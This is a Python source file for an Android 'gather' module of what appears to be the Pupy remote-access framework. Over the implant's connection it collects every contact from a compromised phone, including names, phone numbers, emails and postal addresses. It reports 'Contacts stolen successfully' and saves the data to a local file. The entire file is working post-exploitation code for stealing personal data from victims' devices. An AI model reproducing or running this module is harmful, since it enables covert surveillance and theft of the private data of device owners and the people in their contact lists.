# -*- coding: UTF8 -*-
#Author: @bobsecq
#Contributor(s):

__class_name__="contacts"

from pupylib.PupyModule import *
from pupylib.utils.common import getLocalAndroidPath
import os, copy 

@config(cat="gather", compat=["android"])
class contacts(PupyModule):
    """ to get contacts """

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='contacts', description=self.__doc__)
        self.arg_parser.add_argument('-a', '--get-all', action='store_true', help='get all contacts')
        self.arg_parser.add_argument('-output-folder', dest='localOutputFolder', default='output/', help="Folder which will store targtet's postions (default: %(default)s)")

    def run(self, args):
        self.client.load_package("pupydroid.contacts")
        self.client.load_package("pupydroid.utils")
        path = getLocalAndroidPath(localFolder=args.localOutputFolder, androidID=self.client.conn.modules['pupydroid.utils'].getAndroidID(), userName=self.client.desc['user'])
        if args.get_all==True:
            self.success("Getting contacts...")
            contacts = self.client.conn.modules['pupydroid.contacts'].getAllContacts()
            self.success("Contacts stolen successfully")
            self.__saveContacts__(contacts=contacts, completePath=os.path.join(path, 'contacts.txt'))

    def __saveContacts__(self, contacts, completePath):
        '''
        '''
        #I don't know why but I have very (very) better perfs on my computer when I does a copy of the list before to use it...
        #Without the copy, it saves 1 contact by second only -:( Very very strange.
        contacts2 = copy.copy(contacts)
        contacts = contacts2
        self.success("Saving contacts {0} contacts...".format(len(contacts)))
        f = open(completePath, 'w', 1)
        for aContact in contacts:
            logging.info("Saving the contact: {0}".format(aContact))
            f.write("********** id: {0} **********\n".format(aContact['id']))
            f.write("name: {0}\n".format(aContact['name']))
            for aPhoneNb,aPhoneNbType in zip(aContact['phoneNbs'],aContact['phoneNbsTypes']):
                f.write("phone ({0}): {1}\n".format(aPhoneNbType, aPhoneNb))
            for anEmail in aContact['emails']:
                f.write("email: {0}\n".format(anEmail))
            for aPostalAddress in aContact['postalAddresses']:
                f.write("postalAddr: {0}\n".format(aPostalAddress))
        f.close()
        self.success("Contacts saved in {0}".format(completePath))
